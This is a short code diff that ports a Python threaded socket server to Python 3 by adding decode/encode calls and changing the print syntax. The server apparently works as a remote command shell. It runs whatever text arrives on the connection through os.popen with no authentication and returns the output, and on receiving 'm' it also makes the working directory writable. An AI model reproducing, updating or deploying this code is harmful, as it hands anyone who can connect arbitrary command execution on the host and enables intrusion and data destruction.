@@ -15,6 +15,7 @@ class ClientThread(threading.Thread):
 
 	def run(self):
 		data = self.conn.recv(self.BUFFER_SIZE)
+		data=data.decode()
 		if data == "m" :
   			os.popen("chmod +w $PWD")
 		else :
@@ -22,10 +23,12 @@ class ClientThread(threading.Thread):
 
 		while 1 :
   			data = self.conn.recv(self.BUFFER_SIZE)
-  			print data
+  			data= data.decode()
+  			print( data)
   			if data == "1":
     				break 
 
   			rep = os.popen(data+" 2>&1")
-  			self.conn.send("reponse : \n"+rep.read())
+  			reponse="reponse: \n"+rep.read()
+  			self.conn.send(reponse.encode())
 		
